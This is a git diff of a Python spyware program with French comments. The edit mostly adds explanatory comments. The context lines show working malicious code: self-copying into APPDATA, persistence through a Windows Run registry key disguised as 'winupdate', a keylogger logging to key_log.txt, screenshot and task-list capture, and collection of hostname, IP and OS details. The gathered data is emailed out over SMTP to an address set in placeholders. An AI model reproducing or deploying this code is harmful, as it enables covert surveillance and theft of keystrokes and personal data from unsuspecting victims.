@@ -20,10 +20,12 @@ import platform
 import shutil
 import pyscreeze
 
+# Données à modifier
 configuser = "L'email pour envoyer"
 configsend = "L'email de réception des données"
 configpassword = "Votre MDP"
 
+# Ajout du logiciel au startup de windows.
 def startup():
         strAppPath = APPDATA + "\\" + os.path.basename(strPath)
         copyfile(strPath, strAppPath)
@@ -31,8 +33,8 @@ def startup():
         objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
         SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
 
-def emailing():
 # Envois les données à une email.
+def emailing():
     email_user = configuser
     email_send = configsend
     email_password = configpassword
@@ -63,6 +65,7 @@ def emailing():
     server.sendmail(email_user,email_send,text)
     server.quit()
 
+# Fonction du Keylogger, log : key_log.txt
 def Keylogger():
 
     log_dir = ""
@@ -81,16 +84,17 @@ def Keylogger():
     #    if key == Key.esc:
     #        return False
 
+# Enregistre la tasklist au moment du lancement du logiciel
 def tasklist():
     tasklist = os.system("tasklist")
     with open("output.txt", "wb") as f:
         f.write(subprocess.check_output(['tasklist']))
         f.close()
 
+# Fait un screenshot de l'écran au moment du lancement du logiciel.
 def screenshot():
     screen = pyscreeze.screenshot("s.png")
 
-# Call botnet server
 def Main():
 
     screenshot()
@@ -102,6 +106,7 @@ def Main():
     hostname = socket.gethostname()
     myip = socket.gethostbyname(hostname)
 
+    # Obtient la plateforme sur laquelle le logiciel est lancé.
     osver = platform.platform()
 
     time.sleep(3600)
@@ -109,5 +114,6 @@ def Main():
 
 # Fin du spyware
 
+# Lance le programme si lancé depuis le exe de base.
 if __name__ == '__main__':
     Main()
